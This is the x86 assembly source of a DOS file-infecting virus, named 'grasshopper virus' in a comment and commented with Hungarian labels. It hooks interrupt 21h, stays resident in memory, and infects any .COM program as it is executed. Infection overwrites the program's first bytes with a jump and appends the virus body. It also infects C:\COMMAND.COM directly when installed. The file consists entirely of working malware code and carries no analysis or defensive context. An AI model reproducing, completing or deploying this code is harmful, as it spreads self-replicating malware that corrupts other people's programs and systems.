.MODEL TINY
.CODE
;grasshopper virus
eleje:



BELEVALO PROC

        MOV SI,5
VISSZAODA:
        MOV AL,BYTE PTR [BP+OFFSET FILEELEJERE-1-OFFSET BELEVALO+SI]
        MOV byte ptr [0FFH+SI],AL
        DEC SI
        JNE VISSZAODA
        push es
        push ds
        call INSTALL
        pop ds
        pop es
        MOV BP,100H
        JMP BP



FILEELEJERE DB 5 DUP (0)

BELEVALO ENDP



FIGYELES PROC

        pushf
        PUSH AX
        CMP AH,4BH
        JNE NEMTOLTES
        push bx
        push cx
        push si
        push ds
        push dx
        PUSH BP
        xor bp,bp

        call fertoz





        pop bp
        pop dx
        pop ds
        pop si
        pop cx
        pop bx

NEMTOLTES:
        POP AX

        popf

        db 0eah
        cim dw ?
        cimseg dw ?



FIGYELES ENDP


FERTOZ PROC



                MOV     si,DX
C_E_1:          INC     si
                CMP     BYTE PTR [si],'.'
                JNE     C_E_1
                INC     si
                CMP     BYTE PTR [si],'C'
                JE      EZ_COM
                CMP     BYTE PTR [si],'c'
                JnE     nem_jo
ez_com:
        MOV AX,3D02H
        INT 21H
        JC NEM_JO
        MOV BX,AX
        PUSH CS
        POP DS


                CALL VEGERE
                ADD AX,100H
                MOV WORD PTR CS:[OFFSET FILEVEGERE-OFFSET ELEJE+BP],AX
                CALL ELEJERE

                MOV DX,OFFSET FILEELEJERE-OFFSET ELEJE
                ADD DX,BP
                MOV CX,5
                MOV AH,3FH
                INT 21H

                CMP BYTE PTR CS:[OFFSET FILEELEJERE-OFFSET ELEJE+BP],0BDH
                JE NEM_JO

                CALL ELEJERE
                MOV DX,OFFSET ROVIDUGRAS-OFFSET ELEJE
                ADD DX,BP
                MOV CX,5
                MOV AH,40h
                INT 21H
                CALL VEGERE
                MOV CX,OFFSET VEGE- OFFSET ELEJE+1
                MOV DX,bp
                MOV AH,40H
                INT 21H

nem_jo:
        MOV AH,3EH
        INT 21H

                ret


FERTOZ ENDP




COM_E           PROC


COM_E           ENDP














ELEJERE PROC

        XOR CX,CX
        XOR DX,DX
        MOV AX,4200H
        INT 21H
        RET

ELEJERE ENDP


VEGERE PROC

        XOR CX,CX
        xor DX,dx
        MOV AX,4202H
        INT 21H
        RET

VEGERE ENDP



ROVIDUGRAS DB 0BDH

FILEVEGERE DW 0

JMP BP







INSTALL PROC




        mov ax,3521h
        int 21h
        mov ax,es
        cmp ax,60h
        je Nem_installaljuk
        mov WORD PTR [OFFSET cim-offset eleje+BP],bx
        mov WORD PTR [OFFSET cimseg-offset eleje+BP],ax

        mov SI,offset VEGE-offset ELEJE
        mov ax,60h
        mov ds,ax
cik:    mov ah,cs:[BP+SI]
        mov ds:[SI],ah
        dec SI
        jnl cik

        mov dx,offset figyeles-offset eleje
        mov ax,2521h
        int 21H




mov dx,offset filenev-offset eleje
add dx,bp
call fertoz

Nem_installaljuk:
        RET




FILENEV DB 'C:\COMMAND.COM',0





INSTALL ENDP

VEGE:

START:  XOR BP,BP
        PUSH CS
        PUSH CS
        POP DS
        POP ES
        MOV AX,CS
        MOV SS,AX
        call INSTALL
        mov ah,4ch
        int 21h




END start
